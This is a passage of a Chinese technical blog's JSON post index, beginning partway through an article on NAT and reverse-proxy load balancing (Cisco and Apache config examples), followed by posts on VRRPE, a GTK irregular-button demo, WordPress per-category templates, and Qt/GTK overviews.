NAT负载均衡可以通过软硬件方式来实现。通过软件方式来实现NAT负载均衡的设备往往受到带宽及系统本身处理能力的限制，由于NAT比较接近网络的低 层，因此就可以将它集成在硬件设备中，通常这样的硬件设备是第四层交换机和专用负载均衡器，第四层交换机的一项重要功能就是NAT负载均衡。 下面以实例介绍一下Cisco路由器NAT负载均衡的配置： 现有一台有一个串行接口和一个Ethernet接口的路由器，Ethernet口连接到内部网络，内部网络上有三台web服务器，但都只是低端配置，为 了处理好来自Internet上大量的web连接请求，因此需要在此路由器上做NAT负载均衡配置，把发送到web服务器合法Internet IP地址的报文转换成这三台服务器的内部本地地址。 其具体配置过程如下： 做好路由器的基本配置，并定义各个接口在做NAT时是内部还是外部接口。 然后定义一个标准访问列表（standard access list），用来标识要转换的合法IP地址。 再定义NAT地址池来标识内部web服务器的本地地址，注意要用到关键字rotary，表明我们要使用轮循（Round Robin）的方式从NAT地址池中取出相应IP地址来转换合法IP报文。 最后，把目标地址为访问表中IP的报文转换成地址池中定义的IP地址。 相应配置文件如下： interface Ethernet0/0 ip address 192.168.1.4 255.255.255.248 ip nat inside ! interface Serial0/0 ip address 200.200.1.1 255.255.255.248 ip nat outside ! ip access-list 1 permit 200.200.1.2 ! ip nat pool websrv 192.168.1.1 192.168.1.3 netmask 255.255.255.248 type rotary ip nat inside destination list 1 pool websrv 反向代理负载均衡 普通代理方式是代理内部网络用户访问internet上服务器的连接请求，客户端必须指定代理服务器,并将本来要直接发送到internet上服务器的连接请求发送给代理服务器处理。 反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。 反向代理负载均衡技术是把将来自internet上的连接请求以反向代理的方式动态地转发给内部网络上的多台服务器进行处理，从而达到负载均衡的目的。 反向代理负载均衡能以软件方式来实现，如apache mod_proxy、netscape proxy等，也可以在高速缓存器、负载均衡器等硬件设备上实现。 反向代理负载均衡可以将优化的负载均衡策略和代理服务器的高速缓存技术结合在一起，提升静态网页的访问速度，提供有益的性能；由于网络外部用户不能直接访 问真实的服务器，具备额外的安全性（同理，NAT负载均衡技术也有此优点）。 其缺点主要表现在以下两个方面： 反向代理是处于OSI参考模型第七层应用的，所以就必须为每一种应用服务专门开发一个反向代理服务器，这样就限制了反向代理负载均衡技术的应用范围，现在一般都用于对web服务器的负载均衡。 针对每一次代理，代理服务器就必须打开两个连接，一个对外，一个对内，因此在并发连接请求数量非常大的时候，代理服务器的负载也就非常大了，在最后代理服务器本身会成为服务的瓶颈。 一般来讲，可以用它来对连接数量不是特别大，但每次连接都需要消耗大量处理资源的站点进行负载均衡，如search。 下面以在apache mod_proxy下做的反向代理负载均衡为配置实例：在站点www.test.com，我们按提供的内容进行分类，不同的服务器用于提供不同的内容服务，将对http://www.test.com/news的访问转到IP地址为192.168.1.1的内部服务器上处理，对http://www.test.com/it的访问转到服务器192.168.1.2上，对http://www.test.com/life的访问转到服务器192.168.1.3上，对http://www.test.com/love的访问转到合作站点http://www.love.com上，从而减轻本apache服务器的负担，达到负载均衡的目的。 首先要确定域名www.test.com在DNS上的记录对应apache服务器接口上具有internet合法注册的IP地址，这样才能使internet上对www.test.com的所有连接请求发送给本台apache服务器。 在本台服务器的apache配置文件httpd.conf中添加如下设置： proxypass /news http://192.168.1.1 proxypass /it http://192.168.1.2 proxypass /life http://192.168.1.3 proxypass /love http://www.love.com 注意，此项设置最好添加在httpd.conf文件”Section 2”以后的位置，服务器192.168.1.1-3也应是具有相应功能的www服务器，在重启服务时，最好用apachectl configtest命令检查一下配置是否有误。 代理服务器 使用代理服务器，可以将请求转发给内部的服务器，使用这种加速模式显然可以提升静态网页的访问速度。然而，也可以考虑这样一种技术，使用代理服务器将请求均匀转发给多台服务器，从而达到负载均衡的目的。 地址转换网关 支持负载均衡的地址转换网关，可以将一个外部IP地址映射为多个内部IP地址，对每次TCP连接请求动态使用其中一个内部地址，达到负载均衡的目的。 协议内部支持负载均衡 除了这三种负载均衡方式之外，有的协议内部支持与负载均衡相关的功能，例如HTTP协议中的重定向能力等，HTTP运行于TCP连接的最高层。 混合型负载均衡 在有些大型网络，由于多个服务器群内硬件设备、各自的规模、提供的服务等的差异，我们可以考虑给每个服务器群采用最合适的负载均衡方式，然后又在这多个 服务器群间再一次负载均衡或群集起来以一个整体向外界提供服务（即把这多个服务器群当做一个新的服务器群），从而达到最佳的性能。我们将这种方式称之为混 合型负载均衡。此种方式有时也用于单台均衡设备的性能不能满足大量连接请求的情况下。 下图展示了一个应用示例，三个服务器群针对各自的特点，分别采用了不同的负载均衡方式。当客户端发出域名解析请求时，DNS服务器依次把它解析成三个服务器群的VIP，如此把客户端的连接请求分别引向三个服务器群，从而达到了再一次负载均衡的目的。 在图中大家可能注意到，负载均衡设备在网络拓朴上，可以处于外部网和内部网络间网关的位置，也可以和内部服务器群处于并行的位置，甚至可以处于内部网络或internet上的任意位置，特别是在采用群集负载均衡时，根本就没有单独的负载均衡设备。 服务器群内各服务器只有提供相同内容的服务才有负载均衡的意义，特别是在DNS负载均衡时。要不然，这样会造成大量连接请求的丢失或由于多次返回内容的不同给客户造成混乱。 所以，如图的这个示例在实际中可能没有多大的意义，因为如此大的服务内容相同但各服务器群存在大量差异的网站并不多见。 但做为一个示例，相信还是很有参考意义的。 本文来源于http://www.ccw.com.cn/cso/htm2007/20071216_357499.shtml","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"VRRP负载均衡技术","slug":"EMBEDDED/VRRP负载均衡技术","date":"2016-05-03T03:05:16.000Z","updated":"2017-07-10T08:51:51.592Z","comments":true,"path":"EMBEDDED/VRRP负载均衡技术.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/VRRP负载均衡技术.html","excerpt":"VRRP负载均衡技术 VRRP负载均衡技术 一、 前言 在VRRP（虚拟路由器冗余协议）标准协议模式中，只有Master路由器可以转发报文，Backup路由器处于监听状态，无法转发报文。虽然创建多个备份组可以实现多个路由器之间的负载分担，但是","text":"VRRP负载均衡技术 VRRP负载均衡技术 一、 前言 在VRRP（虚拟路由器冗余协议）标准协议模式中，只有Master路由器可以转发报文，Backup路由器处于监听状态，无法转发报文。虽然创建多个备份组可以实现多个路由器之间的负载分担，但是局域网内的主机需要设置不同的网关，增加了配置的复杂性。 VRRP负载均衡模式(下面简称在VRRPE)提供的虚拟网关冗余备份功能基础上，增加了负载均衡功能.实现同一个备份组里的Master和Backup路由器都转发报文。 图 1 VRRPE实现的负载均衡功能 二、 VRRPE技术介绍 2.1 VRRPE的基本工作原理 在一个备份组里将一个虚拟IP地址与多个虚拟MAC地址对应，VRRP备份组中的每个路由器都对应一个虚拟MAC地址，使得每个路由器都能转发流量。避免了VRRP备份组中Backup设备始终处于空闲状态、网络资源利用率不高的问题。如下图中，在下面以10.1.1.1为网关的PC，其获得的网关的arp表项都对应不同的虚MAC.：host A对应route A的虚mac、host B对应route B的虚mac，host C对应route C的虚mac。 图 2 VRRPE的工作原理 2.2 VRRPE中的基本概念 l AVF：虚拟转发器(Active Virtual Forwarder)，作为AVF负责转发目的MAC地址为虚拟MAC地址的流量； l LVF：备用虚拟转发器(Listening Virtual Forwarder)，LVF监视AVF的状态，当AVF出现故障时，LVF将选举出优先级最高的虚拟转发器作为AVF； l VMAC：虚Mac地址(Virtual MAC Address)； l VF Owner：虚拟转发器的拥有者（Virtual Forwarder Owner）。 如图中：Router A是000f-e2ff-0041的AVF，Router B、Router C是000f-e2ff-0041的LVF； 图 3 VRRPE基本概念相关 2.3 VRRPE的实现机制 流程一：同一备份组中的路由器之间选举Master（选举方式和VRRP的标准模式相同） 流程二：Backup设备发送Request报文向Master设备请求虚拟MAC，Master设备通过Replay报文给Backup设备分配虚拟MAC地址。 流程三：Master根据负载均衡算法为来自主机的ARP/ND请求，应答不同的虚拟MAC地址，从而实现流量在多个路由器之间分担。备份组中的Backup路由器不会应答主机的 ARP/ND请求。 三、 小结 本文介绍了VRRP负载均衡模式的特点，以及其的工作原理和实现机制，我司的v5平台的三层交换机S12500、S9500E、S5800均支持该特性，因其能实现同一个vrrp组的负载均衡，在数据中心的接入侧有着广泛的应用场景。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"用word写个文章试试哈","slug":"EMBEDDED/用word写个文章试试哈","date":"2016-05-03T02:28:55.000Z","updated":"2017-07-10T02:01:05.143Z","comments":true,"path":"EMBEDDED/用word写个文章试试哈.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/用word写个文章试试哈.html","excerpt":"哎果然是提前的设计大于过早的实施 写好后想要修改真的很麻烦呀","text":"哎果然是提前的设计大于过早的实施 写好后想要修改真的很麻烦呀","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Jennifer Nettles - Hey Heartbreak","slug":"EMBEDDED/jennifer-nettles-hey-heartbreak","date":"2016-05-01T11:55:00.000Z","updated":"2017-07-10T02:01:05.142Z","comments":true,"path":"EMBEDDED/jennifer-nettles-hey-heartbreak.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/jennifer-nettles-hey-heartbreak.html","excerpt":"[audio mp3=”http://www.madhex.com/wp-content/uploads/2016/05/1.mp3\"][/audio]","text":"[audio mp3=”http://www.madhex.com/wp-content/uploads/2016/05/1.mp3&quot;][/audio]","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"代码高亮测试哦","slug":"EMBEDDED/代码高亮测试哦","date":"2016-04-30T16:39:23.000Z","updated":"2017-09-25T07:29:46.874Z","comments":true,"path":"EMBEDDED/代码高亮测试哦.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/代码高亮测试哦.html","excerpt":"12345678910111213 include stdio.hint main(){printf(\"hello worldrn\");return 0;}","text":"12345678910111213include stdio.hint main()&lt;!-- more --&gt;&#123;&lt;!--more--&gt;&lt;!--more--&gt;printf(\"hello worldrn\");return 0;&#125;","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"gtk+ 实现不规则按钮和透明窗口","slug":"EMBEDDED/gtk+ 实现不规则按钮和透明窗口","date":"2013-04-04T17:35:00.000Z","updated":"2017-07-10T08:49:28.480Z","comments":true,"path":"EMBEDDED/gtk+ 实现不规则按钮和透明窗口.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/gtk+ 实现不规则按钮和透明窗口.html","excerpt":"` #include gint mouse_event_handle(GtkWidget widget, GdkEventButton event, gpointer data) { GdkPixbuf pixbuf; GdkP","text":"` #include &lt;gtk/gtk.h&gt; gint mouse_event_handle(GtkWidget widget, GdkEventButton event, gpointer data){GdkPixbuf pixbuf;GdkPixmap pixmap;GdkBitmap bitmap;GtkWidget oldImage;GtkWidget *newImage;switch(event-&gt;button) {case 1:printf(“Left “);break;case 2:printf(“Middle “);break;case 3:printf(“Right “);break;default:printf(“Unknown “);} switch(event-&gt;type){case GDK_BUTTON_PRESS:printf(“Mouse button press at (%.2f, %.2f)n”, event-&gt;x, event-&gt;y);oldImage = GTK_WIDGET(gtk_container_children(GTK_CONTAINER(widget))-&gt;data);gtk_object_ref(GTK_OBJECT(oldImage));gtk_container_remove(GTK_CONTAINER(widget), oldImage);pixbuf = gdk_pixbuf_new_from_file (“press.png”, NULL);newImage = gtk_image_new_from_pixbuf (pixbuf);gdk_pixbuf_render_pixmap_and_mask(pixbuf, &amp;pixmap, &amp;bitmap, 128);gtk_widget_shape_combine_mask(widget, bitmap, 0, 0);gtk_container_add(GTK_CONTAINER(widget), newImage);gtk_widget_show(newImage);break;case GDK_BUTTON_RELEASE:printf(“Mouse button release at (%.2f, %.2f)n”, event-&gt;x, event-&gt;y);oldImage = GTK_WIDGET(gtk_container_children(GTK_CONTAINER(widget))-&gt;data);gtk_object_ref(GTK_OBJECT(oldImage));gtk_container_remove(GTK_CONTAINER(widget), oldImage);pixbuf = gdk_pixbuf_new_from_file (“enter.png”, NULL);newImage = gtk_image_new_from_pixbuf (pixbuf);gdk_pixbuf_render_pixmap_and_mask(pixbuf, &amp;pixmap, &amp;bitmap, 128);gtk_widget_shape_combine_mask(widget, bitmap, 0, 0);gtk_container_add(GTK_CONTAINER(widget), newImage);gtk_widget_show(newImage);break;case GDK_ENTER_NOTIFY:printf(“Mouse enter.n”);oldImage = GTK_WIDGET(gtk_container_children(GTK_CONTAINER(widget))-&gt;data);gtk_object_ref(GTK_OBJECT(oldImage));gtk_container_remove(GTK_CONTAINER(widget), oldImage);pixbuf = gdk_pixbuf_new_from_file (“enter.png”, NULL);newImage = gtk_image_new_from_pixbuf (pixbuf);gdk_pixbuf_render_pixmap_and_mask(pixbuf, &amp;pixmap, &amp;bitmap, 128);gtk_widget_shape_combine_mask(widget, bitmap, 0, 0);gtk_container_add(GTK_CONTAINER(widget), newImage);gtk_widget_show(newImage);break;case GDK_LEAVE_NOTIFY:printf(“Mouse leave.n”);oldImage = GTK_WIDGET(gtk_container_children(GTK_CONTAINER(widget))-&gt;data);gtk_object_ref(GTK_OBJECT(oldImage));gtk_container_remove(GTK_CONTAINER(widget), oldImage);pixbuf = gdk_pixbuf_new_from_file (“leave.png”, NULL);newImage = gtk_image_new_from_pixbuf (pixbuf);gdk_pixbuf_render_pixmap_and_mask(pixbuf, &amp;pixmap, &amp;bitmap, 128);gtk_widget_shape_combine_mask(widget, bitmap, 0, 0);gtk_container_add(GTK_CONTAINER(widget), newImage);gtk_widget_show(newImage);break;default:printf(“n”);break;}return FALSE;} int main(int argc, char argv[]){GtkWidget window = NULL;GdkPixbuf pixbuf = NULL;GdkPixmap pixmap = NULL;GdkBitmap *bitmap = NULL; GtkWidget image = NULL;GtkWidget eventbox = NULL;GtkWidget *fixed = NULL; gtk_init(&amp;argc,&amp;argv); window = gtk_window_new(GTK_WINDOW_TOPLEVEL);gtk_window_set_title(GTK_WINDOW(window),”ZQButton Demo”);gtk_widget_set_events(window, GDK_SCROLL_MASK);gtk_widget_set_app_paintable(window,TRUE);gtk_widget_realize (window);//gtk_window_fullscreen(GTK_WINDOW(window));gtk_widget_set_size_request(window, 800, 600);g_signal_connect (G_OBJECT (window), “delete_event”, G_CALLBACK (gtk_main_quit), NULL); fixed = gtk_fixed_new();gtk_container_add (GTK_CONTAINER(window), fixed);pixmap = gdk_pixmap_new (fixed-&gt;window, 800, 600, -1); // gdk_window_set_back_pixmap (fixed-&gt;window, pixmap, FALSE);gtk_widget_show(fixed); eventbox=gtk_event_box_new();gtk_widget_set_events(eventbox, GDK_MOTION_NOTIFY | GDK_BUTTON_PRESS | GDK_BUTTON_RELEASE| GDK_ENTER_NOTIFY | GDK_LEAVE_NOTIFY); g_signal_connect(G_OBJECT(eventbox), “button_press_event”, GTK_SIGNAL_FUNC(mouse_event_handle), NULL);g_signal_connect(G_OBJECT(eventbox), “button_release_event”, GTK_SIGNAL_FUNC(mouse_event_handle), NULL);g_signal_connect(G_OBJECT(eventbox), “enter_notify_event”, GTK_SIGNAL_FUNC(mouse_event_handle), NULL);g_signal_connect(G_OBJECT(eventbox), “leave_notify_event”, GTK_SIGNAL_FUNC(mouse_event_handle), NULL);gtk_fixed_put (GTK_FIXED (fixed), eventbox, 10, 10);pixbuf = gdk_pixbuf_new_from_file (“leave.png”, NULL);image = gtk_image_new_from_pixbuf (pixbuf);gdk_pixbuf_render_pixmap_and_mask(pixbuf, &amp;pixmap, &amp;bitmap, 128);gtk_widget_shape_combine_mask(eventbox, bitmap, 0, 0);gtk_widget_shape_combine_mask(window, bitmap, 10, 10);gtk_container_add(GTK_CONTAINER(eventbox), image);gtk_widget_show(image);gtk_widget_show(eventbox); gtk_widget_show(window);gtk_main();return FALSE;}`","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"WordPress不同分类目录调用不同模板","slug":"EMBEDDED/WordPress不同分类目录调用不同模板","date":"2013-04-04T15:27:21.000Z","updated":"2017-07-10T08:52:01.586Z","comments":true,"path":"EMBEDDED/WordPress不同分类目录调用不同模板.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/WordPress不同分类目录调用不同模板.html","excerpt":"为了给我某个网站改版，达到WordPress不同分类目录调用不同模板这个效果，折腾了许久，找到一有效办法，下面分享： WordPress是国外著名的开源博客程序，因为其结构的标准性和易用性也被越来越多的网站所使用，Wordpress更多的还是被用来做新","text":"为了给我某个网站改版，达到WordPress不同分类目录调用不同模板这个效果，折腾了许久，找到一有效办法，下面分享： WordPress是国外著名的开源博客程序，因为其结构的标准性和易用性也被越来越多的网站所使用，Wordpress更多的还是被用来做新闻或者产品的发布平台。因为网站开发或者用户的需要所以我们常常也会为不同的分类目录添加不同的模板页面，以变得更有个性化。但Wordpress主题中默认控制分类栏目的一般都只有category.php或者single.php页面，不过我有个站的主题是在archive.php这个模板。所以大家自己根据自己的主题在找到控制分类目录的那个模板。下面我们就来为分类目录添加不同的模板样式了： 首先我们要做的就是找到你网站正在使用的主题文件(默认路径..wp-contentthemes)，并用编辑器打开category.php文件，然后用下面的代码替换里面除get_header()与get_footer()除外的代码，并将原来被替换的代码拷贝出来并粘贴到你新建的模板文件中，如category_default.php。 &nbsp; &lt;?php$post = $wp_query-&gt;post;if(in_category(‘16’)) {include(TEMPLATEPATH.’/category_16.php’);}else if (in_category(‘7’)){include(TEMPLATEPATH.’/category_7.php’);}else {include(TEMPLATEPATH.’/category-default.php’);}?&gt; &nbsp; 一般最终结果如下面这样既可，不过某些主题除了get_header()和get_footer()还有例如&lt;?php get_sidebar(); ?&gt;之类的，请灵活修改。 &nbsp; &lt;?php get_header(); ?&gt;&lt;?php$post = $wp_query-&gt;post;if(in_category(‘16’)) {include(TEMPLATEPATH.’/category_16.php’);}else if (in_category(‘7’)){include(TEMPLATEPATH.’/category_7.php’);}else {include(TEMPLATEPATH.’/category-default.php’);}?&gt;&lt;?php get_footer(); ?&gt; &nbsp; 这段代码函数的主要作用就是根据分类目录的ID去判断并调用对应的模板，如果分类目录ID为16，则为这个分类目录调用category_16.php模板，如果ID为7，则调用category_7.php模板，如果以上两者都不是则调用category-default.php这个默认的模板。当然了，如果你如果需要给更多的分类目录指定模板，你只需要再添加一个else if语句既可，如下面代码所示： &nbsp; &lt;?php get_header(); ?&gt;&lt;?php$post = $wp_query-&gt;post;if(in_category(‘16’)) {include(TEMPLATEPATH.’/category_16.php’);}else if (in_category(‘7’)){include(TEMPLATEPATH.’/category_7.php’);}else if (in_category(‘8’)){include(TEMPLATEPATH.’/category_8.php’);}else {include(TEMPLATEPATH.’/category-default.php’);}?&gt;&lt;?php get_footer(); ?&gt; &nbsp; 另外要注意的就是category_8.php等这些模板文件的调用路径了，如果你想单独新建一个文件夹来放这些分类目录模板文件，那上面代码中也要一起修改。 到这里为不同的分类目录调用不同的模板就结束了，最后你要做的就是根据自己的完美思想去定义模板文件了。 2013-03-29补充： 如果大家按照上述方法修改后出现无效或者调用混乱等情况，可以把上面的“in_category”改成“is_category”再试试看。 我自己修改的时候遇到过这个问题，按照补充的方法解决了。 &nbsp; 按同样的原理,&lt;?php if(is_category(指定ID)){ ?&gt;&lt;link rel=”stylesheet” type=”text/css” media=”all” href=”&lt;?php%20bloginfo(‘template_url’);%20?&gt;/is_category/is_category1.css”/&gt;&lt;?php }?&gt;这样就可以指定所要的CSS了,CSS也分身几个调用就是了","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"QT跨平台的C++应用和UI开发库","slug":"EMBEDDED/QT跨平台的C++应用和UI开发库 (2)","date":"2013-04-04T14:05:45.000Z","updated":"2017-07-10T08:51:22.376Z","comments":true,"path":"EMBEDDED/QT跨平台的C++应用和UI开发库 (2).html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/QT跨平台的C++应用和UI开发库 (2).html","excerpt":"Qt 是一个跨平台的C++图形用户界面应用程序框架。它提供给应用程序开发者建立艺术级的图形用户界面所需的所用功能。Qt是完全面向对象的，很容易扩展，并且允许真正地组件编程。","text":"Qt 是一个跨平台的C++图形用户界面应用程序框架。它提供给应用程序开发者建立艺术级的图形用户界面所需的所用功能。Qt是完全面向对象的，很容易扩展，并且允许真正地组件编程。&lt;ignore_js_op&gt; &lt;ignore_js_op&gt; &lt;ignore_js_op&gt; &lt;ignore_js_op&gt;基本上，Qt 同 X Window 上的 Motif，Openwin，GTK 等图形界 面库和 Windows 平台上的 MFC，OWL，VCL，ATL 是同类型的东西，但是 Qt 具有下列优点: 优良的跨平台特性:Qt支持下列操作系统: Microsoft Windows 95/98， Microsoft Windows NT， Linux， Solaris， SunOS， HP-UX， Digital UNIX (OSF/1， Tru64)， Irix， FreeBSD， BSD/OS， SCO， AIX， OS390，QNX 等等。 面向对象Qt 的良好封装机制使得 Qt 的模块化程度非常高，可重用性较好，对于用户开发来说是非常 方便的。 Qt 提供了一种称为 signals/slots 的安全类型来替代 callback，这使得各个元件 之间的协同工作变得十分简单。 丰富的 APIQt 包括多达 250 个以上的 C++ 类，还替供基于模板的 collections， serialization， file， I/O device， directory management， date/time 类。甚至还包括正则表达式的处理 功能。 支持 2D/3D 图形渲染，支持 OpenGL 大量的开发文档 XML 支持在线Qt文档：http://www.ostools.net/apidocs/apidoc?api=qt","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"GTK跨多种平台的图形库","slug":"EMBEDDED/GTK跨多种平台的图形库","date":"2013-04-04T13:52:41.000Z","updated":"2017-07-10T08:49:32.953Z","comments":true,"path":"EMBEDDED/GTK跨多种平台的图形库.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/GTK跨多种平台的图形库.html","excerpt":"GTK(GIMP Toolkit)是一套跨多种平台的图形工具包,按LGPL许可协议发布的。虽然最初是为GIMP写的，但目前已发展为一个功能强大、设计灵活的一个通用图形库。特别是被GNOME选中使得GTK+广为流传，成为Linux下开发图形界面的应用程序的主","text":"GTK(GIMP Toolkit)是一套跨多种平台的图形工具包,按LGPL许可协议发布的。虽然最初是为GIMP写的，但目前已发展为一个功能强大、设计灵活的一个通用图形库。特别是被GNOME选中使得GTK+广为流传，成为Linux下开发图形界面的应用程序的主流开发工具之一，当然GTK+并不要求必须在Linux上，事实上，目前GTK+已经有了成功的windows版本。 GTK虽然是用C语言写的，但是您可以使用你熟悉的语言了使用GTK，因为GTK+已经被绑定到几乎所有流行的语言上，如：C++, Guile, Perl, Python, TOM, Ada95, Objective C, Free Pascal, and Eiffel。 平台：windows,linux优点：由纯c语言开发，也采用面向对象思想。更底层，依赖少。缺点：开发效率相对较低。兼容第三方库较少，例如缺乏数据库的支持等！其他：以LGPL许可协议分发 注:这个本人最喜欢图形库,虽然功能较少，但给本人的感觉是，本库在开发时图形界面和程序可以完全脱离、图形库就是图形库，程序就是程序，并不混淆。不像MFC，让我感到混乱！但还是那句话，萝卜青菜各有所爱，适合自己的才是最好的！","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"QT跨平台的C++应用和UI开发库","slug":"EMBEDDED/QT跨平台的C++应用和UI开发库","date":"2013-04-03T11:38:21.000Z","updated":"2017-07-10T08:51:25.932Z","comments":true,"path":"EMBEDDED/QT跨平台的C++应用和UI开发库.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/QT跨平台的C++应用和UI开发库.html","excerpt":"Qt 是一个跨平台的C++图形用户界面应用程序框架。它提供给应用程序开发者建立艺术级的图形用户界面所需的所用功能。Qt是完全面向对象的，很容易扩展，并且允许真正地组件编程。 基本上，Qt 同 X Window 上的 Motif，Openwin，GTK 等","text":"Qt 是一个跨平台的C++图形用户界面应用程序框架。它提供给应用程序开发者建立艺术级的图形用户界面所需的所用功能。Qt是完全面向对象的，很容易扩展，并且允许真正地组件编程。 基本上，Qt 同 X Window 上的 Motif，Openwin，GTK 等图形界 面库和 Windows 平台上的 MFC，OWL，VCL，ATL 是同类型的东西，但是 Qt 具有下列优点:&nbsp; 优良的跨平台特性:Qt支持下列操作系统: Microsoft Windows 95/98， Microsoft Windows NT， Linux， Solaris， SunOS， HP-UX， Digital UNIX (OSF/1， Tru64)， Irix， FreeBSD， BSD/OS， SCO， AIX， OS390，QNX 等等。 面向对象Qt 的良好封装机制使得 Qt 的模块化程度非常高，可重用性较好，对于用户开发来说是非常 方便的。 Qt 提供了一种称为 signals/slots 的安全类型来替代 callback，这使得各个元件 之间的协同工作变得十分简单。 丰富的 APIQt 包括多达 250 个以上的 C++ 类，还替供基于模板的 collections， serialization， file， I/O device， directory management， date/time 类。甚至还包括正则表达式的处理 功能。 支持 2D/3D 图形渲染，支持 OpenGL 大量的开发文档 XML 支持在线Qt文档：http://www.ostools.net/apidocs/apidoc?api=qt","categories":[{"name":"linux","slug":"linux","permalink":"http://demonelf.github.io/categories/linux/"},{"name":"EMBEDDED","slug":"linux/EMBEDDED","permalink":"http://demonelf.github.io/categories/linux/EMBEDDED/"}],"tags":[]}]}